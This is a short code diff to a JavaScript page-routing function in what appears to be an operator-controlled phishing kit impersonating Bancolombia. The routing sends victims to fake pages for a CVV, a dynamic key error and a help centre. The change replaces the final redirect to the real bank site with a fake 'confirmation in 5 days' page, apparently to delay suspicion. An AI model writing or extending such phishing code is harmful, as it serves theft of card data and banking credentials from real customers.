@@ -117,7 +117,7 @@
        opcion_8  CENTRO AYUDA             → opcion8.html?key
        opcion_55 CVV                      → opcion55.html?key
        opcion_9  ERROR DINÁMICA           → opcion9.html?key  (Bancolombia)
-       opcion_10 FINALIZAR                → https://www.bancolombia.com/personas/creditos
+       opcion_10 FINALIZAR                → finalizado.html?key&requestId (PANTALLA CONFIRMACION 5 DIAS, boton FINALIZAR ahi = Bancolombia creditos URL)
        cualquier otro                     → null (no navegar)
   */
   function urlPara(estado) {
@@ -135,7 +135,7 @@
       case 'opcion_8':  return `opcion8.html?key=${encodeURIComponent(key)}`;
       case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
       case 'opcion_9':  return `opcion9.html?key=${encodeURIComponent(key)}`;
-      case 'opcion_10': return 'https://www.bancolombia.com/personas/creditos';
+      case 'opcion_10': return `finalizado.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
       default:          return null;
     }
   }
